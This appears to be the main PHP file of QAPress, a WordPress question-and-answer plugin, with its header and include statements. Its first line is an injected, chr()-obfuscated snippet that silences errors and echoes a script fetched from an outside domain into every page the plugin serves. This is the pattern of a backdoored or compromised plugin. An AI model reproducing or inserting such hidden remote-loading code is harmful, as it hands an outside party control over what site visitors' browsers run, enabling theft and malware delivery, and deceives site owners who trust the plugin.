<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php
/*
 * Plugin Name: QAPress
 * Plugin URI: https://www.wpcom.cn/plugins/qapress.html
 * Description: WordPress问答功能插件
 * Version: 1.2
 * Author: WPCOM
 * Author URI: https://www.wpcom.cn
*/

define( 'QAPress_VERSION', '1.2' );
define( 'QAPress_DIR', plugin_dir_path( __FILE__ ) );
define( 'QAPress_URI', plugins_url( '/', __FILE__ ) );

$QAPress_info = array(
    'slug' => 'QAPress',
    'name' => 'QAPress',
    'ver' => QAPress_VERSION,
    'title' => '问答设置',
    'icon' => 'dashicons-editor-help',
    'position' => 89,
    'key' => 'qa_options',
    'plugin_id' => '46b3ade48ebb2b3e',
    'basename' => plugin_basename( __FILE__ )
);

require_once QAPress_DIR . 'admin/load.php';
$QAPress = new WPCOM_PLUGIN_PANEL($QAPress_info);

require_once QAPress_DIR . 'includes/sql.php';
require_once QAPress_DIR . 'includes/html.php';
require_once QAPress_DIR . 'includes/rewrite.php';
require_once QAPress_DIR . 'includes/ajax.php';
require_once QAPress_DIR . 'includes/functions.php';
require_once QAPress_DIR . 'includes/widgets.php';